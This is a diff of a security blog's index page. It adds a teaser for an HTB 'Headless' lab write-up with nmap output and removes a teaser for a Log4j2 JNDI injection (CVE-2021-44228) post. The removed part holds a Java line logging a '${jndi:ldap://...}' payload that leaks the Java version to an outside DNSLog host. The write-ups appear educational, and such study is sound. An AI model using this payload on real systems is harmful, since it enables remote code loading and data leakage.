@@ -137,6 +137,39 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/05/10/writeup/htb/HTB Headless/" >HTB Headless</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-05-10  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Headless-Linux-·-Easy"><a href="#Headless-Linux-·-Easy" class="headerlink" title="Headless (Linux · Easy)"></a>Headless (Linux · Easy)</h1><p>XSS+SUID提权</p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sT -sV - 10.10.11.8</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.8 (10.10.11.8)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)</span><br><span class="line">|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.2.2 Python/3.11.2</span><br><span class="line">|     Date: Sun, 28 Apr 2024 07:24:48 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 2799</span><br><span class="line">|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Under Construction&lt;/title&gt;</span><br><span class="line">|     &lt;style&gt;</span><br><span class="line">|     body &#123;</span><br><span class="line">|     font-family: &#x27;Arial&#x27;, sans-serif;</span><br><span class="line">|     background-color: #f7f7f7;</span><br><span class="line">|     margin: 0;</span><br><span class="line">|     padding: 0;</span><br><span class="line">|     display: flex;</span><br><span class="line">|     justify-content: center;</span><br><span class="line">|     align-items: center;</span><br><span class="line">|     height: 100vh;</span><br><span class="line">|     .container &#123;</span><br><span class="line">|     text-align: center;</span><br><span class="line">|     background-color: #fff;</span><br><span class="line">|     border-radius: 10px;</span><br><span class="line">|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://10.10.11.8:5000/">http://10.10.11.8:5000/</a></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240428182551382.png" alt="image-20240428182551382"></p>
+<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240428182842525.png" alt="image-20240428182842525"></p>
+<p>&#x2F;support</p>
+	
+	</div>
+  <a type="button" href="/2024/05/10/writeup/htb/HTB Headless/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/04/12/vuln/2017 Fastjson 远程命令执行漏洞/" >Fastjson 远程命令执行漏洞(CVE-2017-18349)</a>
 		</h3>
 		</div>
@@ -164,42 +197,6 @@
 	
 	</div>
   <a type="button" href="/2024/04/12/vuln/2017 Fastjson 远程命令执行漏洞/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/04/02/vuln/2021 Log4j2 lookup JNDI注入/" >Log4j2 lookup JNDI注入(CVE-2021-44228)</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-04-02  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="Log4j2-lookup-JNDI注入-CVE-2021-44228"><a href="#Log4j2-lookup-JNDI注入-CVE-2021-44228" class="headerlink" title="Log4j2 lookup JNDI注入(CVE-2021-44228)"></a>Log4j2 lookup JNDI注入(CVE-2021-44228)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Log4j2在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j2的漏洞</p>
-<p><strong>影响版本</strong></p>
-<p>Apache Log4j 2.x &lt;&#x3D; 2.14.1</p>
-<p><strong>Log4j2依赖</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p><strong>DNSLog</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://$&#123;sys:java.version&#125;.hzitqenuvp.dgrh3.cn&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Java版本信息呈现</p>
-	
-	</div>
-  <a type="button" href="/2024/04/02/vuln/2021 Log4j2 lookup JNDI注入/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -250,13 +247,15 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
+			<li><a href="/categories/Certifications/">Certifications<span>1</span></a></li>
+		
 			<li><a href="/categories/Java/">Java<span>12</span></a></li>
 		
 			<li><a href="/categories/Javascript/">Javascript<span>1</span></a></li>
 		
 			<li><a href="/categories/Others/">Others<span>1</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>15</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
 		
 			<li><a href="/categories/Php/">Php<span>2</span></a></li>
 		
@@ -266,7 +265,7 @@
 		
 			<li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
 		
-			<li><a href="/categories/Writeup/">Writeup<span>13</span></a></li>
+			<li><a href="/categories/Writeup/">Writeup<span>12</span></a></li>
 		
 		</ul>
 	</div>
@@ -277,45 +276,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+			<li><a href="/tags/Http/">Http<span>1</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+		
+			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
+		
+			<li><a href="/tags/General/">General<span>1</span></a></li>
+		
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
 		
 			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
 		
 			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
 		
-			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
-		
-			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>8</span></a></li>
-		
-			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
-		
-			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
-		
-			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
-		
-			<li><a href="/tags/Http/">Http<span>1</span></a></li>
-		
-			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
-		
-			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
-		
 			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
 		
-			<li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
 		
-			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
+			<li><a href="/tags/Base/">Base<span>5</span></a></li>
 		
-			<li><a href="/tags/General/">General<span>1</span></a></li>
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
 		
 			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
 		
 			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
 		
-			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
+		
+			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
 		
 			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
 		
-			<li><a href="/tags/Base/">Base<span>5</span></a></li>
+			<li><a href="/tags/CISCN/">CISCN<span>2</span></a></li>
+		
+			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>9</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>21</span></a></li>
